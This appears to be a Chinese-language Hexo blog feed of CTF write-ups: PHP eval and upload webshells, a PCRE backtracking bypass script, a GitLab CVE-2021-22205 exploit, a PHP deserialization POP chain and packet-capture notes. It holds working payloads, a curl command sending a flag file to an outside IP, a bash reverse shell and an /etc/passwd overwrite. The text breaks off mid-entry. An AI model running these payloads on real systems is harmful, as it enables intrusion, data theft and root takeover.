href="http://www.atoolbox.net/Tool.php?Id=937%E8%BF%9B%E8%A1%8C%E8%A7%A3%E7%A0%81">http://www.atoolbox.net/Tool.php?Id=937%E8%BF%9B%E8%A1%8C%E8%A7%A3%E7%A0%81</a></p><p><img src="/2023/11/27/give_me_Goerlieth/image/image-20231027142626076-1700993943478-115.png" alt="image-20231027142626076"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">👝👘👠👩👞👘👤👜</span><br><span class="line"></span><br><span class="line">fairgame</span><br></pre></td></tr></table></figure><p>之后Playfair解密<a href="http://www.metools.info/code/playfair_186.html">http://www.metools.info/code/playfair_186.html</a></p><p><img src="/2023/11/27/give_me_Goerlieth/image/image-20231027142702429-1700993943478-116.png" alt="image-20231027142702429"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ctttttttt</title>
      <link href="/2023/11/21/-Ctttttttt/"/>
      <url>/2023/11/21/-Ctttttttt/</url>
      
        <content type="html"><![CDATA[<p><img src="/2023/11/21/-Ctttttttt/image/image-20231129130149695.png" alt="image-20231129130149695"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF题目练习</title>
      <link href="/2023/11/15/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%5Deasycon/"/>
      <url>/2023/11/15/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%5Deasycon/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSCTF题目练习"><a href="#NSSCTF题目练习" class="headerlink" title="NSSCTF题目练习"></a>NSSCTF题目练习</h1><h2 id="羊城杯-2020-easycon"><a href="#羊城杯-2020-easycon" class="headerlink" title="[羊城杯 2020]easycon"></a>[羊城杯 2020]easycon</h2><p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917120408654-1700014518989-3-1700014609953-9-1700015416328-19-1700989325379-1-1700994157322-1.png"></p><p>御剑扫到2个相关，访问url&#x2F;index.php跳转到</p><p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917120610438-1700014609945-7-1700989325380-2-1700994157323-2.png"></p><p>之后出现</p><p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917120504348-1700014609945-8-1700989325380-3-1700994157323-3.png"></p><p>那个弹窗eval post cmd应该是提示，</p><p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917120721712-1700989325380-4-1700994157323-5.png"></p><p>果然，可以执行命令，我们cmd&#x3D;system(“cat b*”);</p><p>发现出现一堆编码，猜测是base64转图片。转换得到flag</p><p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917120911281-1700989325380-6-1700994157323-4.png"></p><h2 id="NSSRound-1-Basic-basic-check"><a href="#NSSRound-1-Basic-basic-check" class="headerlink" title="[NSSRound#1 Basic]basic_check"></a>[NSSRound#1 Basic]basic_check</h2><p>bp抓包，改请求方式为PUT，写个一句话木马</p><p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917121422892-1700989325380-5-1700994157323-6.png"></p><p>发现1.php被写入成功</p><p>回到网页访问，执行命令</p><p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917121538182-1700989325380-7-1700994157323-7.png"></p><p>##[MoeCTF 2022]ezhtml</p><p>查看页面源代码，在evil.js文件里发现flag</p><h2 id="NISACTF-2022-middlerce"><a href="#NISACTF-2022-middlerce" class="headerlink" title="[NISACTF 2022]middlerce"></a>[NISACTF 2022]middlerce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$txw4ever</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;</span>,<span class="variable">$txw4ever</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;再加把油喔&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">checkdata</span>(<span class="variable">$command</span>);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这题炸似一看很简单，一道rce罢了，试了试，难以言说。。。。。</p><p>这道题需要用到prce回溯，正则匹配的回溯次数按英文版来最大此时是100万，就是说，正则匹配，匹配100万次后，便不再匹配，可以看这片文章<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><p>后面还有一个json_decode解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br></pre></td></tr></table></figure><p>本地测试一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;111111&quot;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$a</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$command</span>);</span><br><span class="line"><span class="comment">//string(6) &quot;111111&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就是解码之后会返回cmd所对应的字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">payload=&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `tail /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#x27; + &quot;@&quot;*(1000000) + &#x27;&quot;&#125;&#x27;</span><br><span class="line">res = requests.post(&quot;node4.anna.nssctf.cn:28390&quot;, data=&#123;&quot;letter&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917135439689-1700989325380-8-1700994157323-8.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新型车联网安全网络协议破解（阶段一）</title>
      <link href="/2023/11/07/%E6%96%B0%E5%9E%8B%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%A0%B4%E8%A7%A3%EF%BC%88%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%89/"/>
      <url>/2023/11/07/%E6%96%B0%E5%9E%8B%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%A0%B4%E8%A7%A3%EF%BC%88%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="新型车联网安全网络协议破解（阶段一）"><a href="#新型车联网安全网络协议破解（阶段一）" class="headerlink" title="新型车联网安全网络协议破解（阶段一）"></a>新型车联网安全网络协议破解（阶段一）</h2><p>下载vpn访问后是一个git</p><p>需要用Proxifier配置代理</p><p>配置代理服务</p><p><img src="/2023/11/07/%E6%96%B0%E5%9E%8B%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%A0%B4%E8%A7%A3%EF%BC%88%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%89/image/image-20231111175609407-1699697773720-4-1699698037625-91-1700990318584-109-1700994516091-83.png" alt="image-20231111175609407"></p><p>配置代理规则</p><p><img src="/2023/11/07/%E6%96%B0%E5%9E%8B%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%A0%B4%E8%A7%A3%EF%BC%88%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%89/image/image-20231111175746684-1699698037624-88-1700990318584-112-1700994516091-85.png" alt="image-20231111175746684"></p><p>之后利用脚本</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">https://github.com/Al1ex/CVE-2021-22205</span></span><br></pre></td></tr></table></figure><p>检测漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2021-22205.py -v true -t http://172.18.0.4/</span><br></pre></td></tr></table></figure><p><img src="/2023/11/07/%E6%96%B0%E5%9E%8B%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%A0%B4%E8%A7%A3%EF%BC%88%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%89/image/image-20231111175940503-1699698037625-89-1700990318584-110-1700994516091-84.png" alt="image-20231111175940503"></p><p>存在漏洞</p><p>执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2021-22205.py -a true -t http://172.18.0.4/ -c &quot;curl -T /home/mping/flag http://123.57.236.154:80&quot;</span><br></pre></td></tr></table></figure><p><img src="/2023/11/07/%E6%96%B0%E5%9E%8B%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%A0%B4%E8%A7%A3%EF%BC%88%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%89/image/image-20231111180232257-1699698037625-90-1700990318584-111-1700994516091-86.png" alt="image-20231111180232257"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/10/25/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90/"/>
      <url>/2023/10/25/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>流量包分析</p><p>http.request.method&#x3D;&#x3D;”POST”  and  http contains </p><p><img src="/2023/10/25/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90/image/19154337_6490072934feb23186-1700989364047-32-1700994430832-7.webp" alt="19154337_6490072934feb23186"></p><ol><li><p>首先第一个问题显而易见是<code>Nmap</code>的端口扫描和服务识别，且<code>tcp contains &quot;nmap&quot;</code>可以流量中发现很多Nmap关键字</p></li><li><p>从流量整体来看，大部分流量包并没有建立起TCP全连接，所以这里应该是<code>TCP SYN扫描</code>，也叫<code>半连接扫描</code>或者<code>半开放扫描</code></p></li><li><p>一直在尝试对其他IP发起TCP连接的扫描的IP也显而易见就是<code>192.168.0.4</code></p></li><li></li><li><p>TCP扫描端口，如果端口开放，则服务端会返回<code>SYN + ACK</code>标志位都处于Set状态的包</p></li><li><p><img src="/2023/10/25/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90/image/resize,m_fixed,w_1184-1700989364047-33-1700994430832-8.webp" alt="从一道题分析Nmap SYN/半连接/半开放扫描流量_TCP半连接扫描_02"></p></li><li><p>利用过滤器：<code>tcp.flags.syn==1 and tcp.flags.ack==1</code>，过滤出两个标志位都处于Set状态下的包，然后包中的源端口即是扫描到的开放端口：<code>80、135、139、445、3389、3306、49157、49165、49155、49154、49153、49152</code></p></li><li><p><img src="/2023/10/25/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90/image/resize,m_fixed,w_1184-1698214009015-4-1700989364047-34-1700994430833-9.webp" alt="从一道题分析Nmap SYN/半连接/半开放扫描流量_半开放扫描_03"></p></li><li></li><li><p><code>tcp contains &quot;Apache&quot;</code>查找关键字即可在HTTP响应头中发现<code>Apache/2.4.23</code></p></li><li><p><img src="/2023/10/25/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90/image/resize,m_fixed,w_1184-1700989364047-33-1700994430832-8.webp" alt="从一道题分析Nmap SYN/半连接/半开放扫描流量_TCP半连接扫描_04"></p></li></ol><p>nmap开放端口筛选：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp.flags.syn==1 and tcp.flags.ack==1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/10/25/new%20starweek%204/"/>
      <url>/2023/10/25/new%20starweek%204/</url>
      
        <content type="html"><![CDATA[<p>new starweek 4</p><p>?key&#x3D;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad”;s:3:”cmd”;s:7:”cat &#x2F;f*”;}</p><p>打开链接，存在很多个类，很明显是php反序列化漏洞利用，需要构造pop链 ，</p><p>关于pop链构造的详细步骤教学，请参考我之前的博客，真的讲得很详细也容易理解：</p><p><a href="http://t.csdnimg.cn/wMYNB">http://t.csdnimg.cn/wMYNB</a></p><p>如果你是刚接触php反序列化利用的题，那么建议先看基础的原理知识：</p><p><a href="http://t.csdnimg.cn/xhqzq">http://t.csdnimg.cn/xhqzq</a></p><p><a href="http://t.csdnimg.cn/jzQjt">http://t.csdnimg.cn/jzQjt</a></p><p><a href="http://t.csdnimg.cn/IHpEq">http://t.csdnimg.cn/IHpEq</a></p><p>由于这道题还出现了</p><p>throw new Exception(“Nope”);</p><p>这个throw就是GC回收（垃圾回收机制），这里需要绕过它。</p><p>首先我们需要知道：</p><p>在php中，当对象被销毁时会自动调用__destruct()方法，但如果程序报错或者抛出异常，就不会触发该魔术方法。</p><p>当一个类创建之后它会自己消失，而 __destruct() 魔术方法的触发条件就是一个类被销毁时触发，而throw那个函数就是回收了自动销毁的类，导致destruct检测不到有东西销毁，从而也就导致无法触发destruct函数。</p><p>我们可以通过提前触发垃圾回收机制来抛出异常，从而绕过GC回收，唤醒__destruct()魔术方法。</p><p>触发垃圾回收机制的方法有：（本质即使对象引用计数归零）</p><p>（1）对象被unset()处理时，可以触发。</p><p>（2）数组对象为NULL时，可以触发。</p><p>我们先正常构造pop链：</p><p>关于pop链的构造和标注真的看我之前那篇博客肯定能懂</p><pre><code>&lt;?php class Start&#123;    public $errMsg;  // 5 Crypto    public function __destruct() &#123;        die($this-&gt;errMsg);      &#125;&#125; class Pwn&#123;    public $obj;   // 2 Web    public function __invoke()&#123;        $this-&gt;obj-&gt;evil();    &#125;    public function evil() &#123;        phpinfo();    &#125;&#125; class Reverse&#123;    public $func;  // 3 Pwn    public function __get($var) &#123;        ($this-&gt;func)();    &#125;&#125; class Web&#123;     public $func; // 1 system    public $var;  // 1 cat /f*    public function evil() &#123;        if(!preg_match(&quot;/flag/i&quot;,$this-&gt;var))&#123;            ($this-&gt;func)($this-&gt;var);        &#125;else&#123;            echo &quot;Not Flag&quot;;        &#125;    &#125;&#125; class Crypto&#123;    public $obj;  // 4 Reverse    public function __toString() &#123;        $wel = $this-&gt;obj-&gt;good;        return &quot;NewStar&quot;;    &#125;&#125; class Misc&#123;      public function evil() &#123;        echo &quot;good job but nothing&quot;;    &#125;&#125; $w = new Web();$w-&gt;func = &#39;system&#39;;$w-&gt;var = &#39;cat /f*&#39;;$p = new Pwn();$p-&gt;obj = $w;$r = new Reverse();$r-&gt;func = $p;$c = new Crypto();$c-&gt;obj = $r;$s = new Start();$s-&gt;errMsg = $c;echo serialize($s); ?&gt;</code></pre><p>我们使用第二中方法（数组对象为NULL）绕过GC回收：</p><pre><code>&lt;?php class Start&#123;    public $errMsg;  // 5 Crypto    public function __destruct() &#123;        die($this-&gt;errMsg);      &#125;&#125; class Pwn&#123;    public $obj;   // 2 Web    public function __invoke()&#123;        $this-&gt;obj-&gt;evil();    &#125;    public function evil() &#123;        phpinfo();    &#125;&#125; class Reverse&#123;    public $func;  // 3 Pwn    public function __get($var) &#123;        ($this-&gt;func)();    &#125;&#125; class Web&#123;     public $func; // 1 system    public $var;  // 1 cat /f*    public function evil() &#123;        if(!preg_match(&quot;/flag/i&quot;,$this-&gt;var))&#123;            ($this-&gt;func)($this-&gt;var);        &#125;else&#123;            echo &quot;Not Flag&quot;;        &#125;    &#125;&#125; class Crypto&#123;    public $obj;  // 4 Reverse    public function __toString() &#123;        $wel = $this-&gt;obj-&gt;good;        return &quot;NewStar&quot;;    &#125;&#125; class Misc&#123;      public function evil() &#123;        echo &quot;good job but nothing&quot;;    &#125;&#125; $w = new Web();$w-&gt;func = &#39;system&#39;;$w-&gt;var = &#39;cat /f*&#39;;$p = new Pwn();$p-&gt;obj = $w;$r = new Reverse();$r-&gt;func = $p;$c = new Crypto();$c-&gt;obj = $r;$s = new Start();$s-&gt;errMsg = $c; $b=array($s,0);echo serialize($b);  ?&gt;</code></pre><p><img src="/2023/10/25/new%20starweek%204/image/image-20231025095940311-1700990426090-221-1700994600468-195.png" alt="image-20231025095940311"></p><p>运行得到：</p><p>a:2:{i:0;O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}}i:1;i:0;} </p><p>我们将最后的 i:1 替换为 i:0</p><p>即：</p><p>a:2:{i:0;O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}}i:0;i:0;} </p><p>构造payload：</p><p>post：fast&#x3D;a:2:{i:0;O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}}i:0;i:0;} </p><p><img src="/2023/10/25/new%20starweek%204/image/image-20231025100216201-1700990426090-222-1700994600468-196.png" alt="image-20231025100216201"></p><p>拿到flag</p><p>flag{558eb633-8715-4922-8201-f8402343b140} </p><p>当然这里保险一点的做法是先执行 ls 命令，然后再使用 ..&#x2F;..&#x2F;..&#x2F; 进行目录穿越 ，找到flag所在目录，再进行 cat，并且这里过滤了关键字 flag，因此我们使用通配符 * 进行匹配。</p><p>bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;123.57.236.154&#x2F;9999 0&gt;&amp;1&quot;</p><p>只是说一般 flag 都在根目录下，所以我直接 cat &#x2F;f*。</p><p>echo ‘d3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgphYmM6JDEkMSoyKjMkR0RYZWNvOXVhR0IuUTBpMHdzRkNBMTowOjA6cm9vdDovcm9vdDovYmluL2Jhc2g&#x3D;’ | base64 -d &gt; &#x2F;etc&#x2F;passwd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /f1ger -o rw,remount</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /f1ger-o ro,remount</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/10/24/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/"/>
      <url>/2023/10/24/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="小迪安全知识积累"><a href="#小迪安全知识积累" class="headerlink" title="小迪安全知识积累"></a>小迪安全知识积累</h1><p> php源码里面有乱码，开头是zend,去搜php解密<a href="https://www.toolnb.com/tools/phpcarbylamine.html">https://www.toolnb.com/tools/phpcarbylamine.html</a></p><p>.net文件反编译</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023年SWPU NSS 秋季招新赛 (校外赛道)</title>
      <link href="/2023/10/19/2023%E5%B9%B4SWPU%20NSS%20%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9B%20(%E6%A0%A1%E5%A4%96%E8%B5%9B%E9%81%93)/"/>
      <url>/2023/10/19/2023%E5%B9%B4SWPU%20NSS%20%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9B%20(%E6%A0%A1%E5%A4%96%E8%B5%9B%E9%81%93)/</url>
      
        <content type="html"><![CDATA[<h1 id="2023年SWPU-NSS-秋季招新赛-校外赛道"><a href="#2023年SWPU-NSS-秋季招新赛-校外赛道" class="headerlink" title="2023年SWPU NSS 秋季招新赛 (校外赛道)"></a>2023年SWPU NSS 秋季招新赛 (校外赛道)</h1><h2 id="一键连接"><a href="#一键连接" class="headerlink" title="一键连接!"></a>一键连接!</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$md5_1 = $_GET[&#x27;md5_1&#x27;];</span><br><span class="line">$md5_2 = $_GET[&#x27;md5_2&#x27;];</span><br><span class="line">$sha1_1 = $_GET[&#x27;sha1_1&#x27;];</span><br><span class="line">$sha1_2 = $_GET[&#x27;sha1_2&#x27;];</span><br><span class="line">$new_player =$_GET[&#x27;new_player&#x27;];</span><br><span class="line">if ($md5_1 !== $md5_2 &amp;&amp; md5($md5_1) === md5($md5_2)) &#123;</span><br><span class="line">    if ($sha1_1 != $sha1_2 &amp;&amp; sha1($sha1_1) === sha1($sha1_2)) &#123;</span><br><span class="line">        if (file_get_contents($new_player) === &quot;Welcome to NSSCTF!!!&quot;) &#123;</span><br><span class="line">            echo &quot;Congratulations~~~~~~~~~&quot;;</span><br><span class="line">            echo &quot;试试need Antsword&lt;br/&gt;&quot;;</span><br><span class="line">            @eval($_POST[&#x27;Nss&#x27;]);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;可曾听过data协议?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;sha1又如何相等呢&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;如何让md5值相等呢¿&quot;;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>?md5_1[]&#x3D;QNKCDZO&amp;md5_2[]&#x3D;s155964671a&amp;sha1_1[]&#x3D;aaroZmOk&amp;sha1_2[]&#x3D;aaK1STfY&amp;new_player&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,Welcome to NSSCTF!!!</p><p>Nss&#x3D;system(“cat &#x2F;flag”);</p><h2 id="NSS-HTTP-CHEKER"><a href="#NSS-HTTP-CHEKER" class="headerlink" title="NSS_HTTP_CHEKER"></a>NSS_HTTP_CHEKER</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /?this_is_get=get_%1t HTTP/1.1</span><br><span class="line">Host: node6.anna.nssctf.cn:28397</span><br><span class="line">User-Agent: NSSCTF</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 17</span><br><span class="line">Origin: http://node6.anna.nssctf.cn:28397</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://node6.anna.nssctf.cn:28397/</span><br><span class="line">Cookie: PHPSESSID=1b41efa492475836bbc4873098999ab3;this_is_cookie=cookie_suki_desu~</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">this_is_post=p03t</span><br></pre></td></tr></table></figure><h2 id="Pingpingping"><a href="#Pingpingping" class="headerlink" title="Pingpingping"></a>Pingpingping</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$_ping = $_GET[&#x27;Ping_ip.exe&#x27;];</span><br><span class="line">if(isset($_ping))&#123;</span><br><span class="line">    system(&quot;ping -c 3 &quot;.$_ping);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $data = base64_encode(file_get_contents(&quot;error.png&quot;));</span><br><span class="line">    echo &quot;&lt;img src=&#x27;data:image/png;base64,$data&#x27;/&gt;&quot;;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><a href="http://node6.anna.nssctf.cn:28422/?Ping%5Bip.exe=127.0.0.1;cat">http://node6.anna.nssctf.cn:28422/?Ping[ip.exe=127.0.0.1;cat</a> &#x2F;flag</p><h2 id="UnS3rialize"><a href="#UnS3rialize" class="headerlink" title="UnS3rialize"></a>UnS3rialize</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 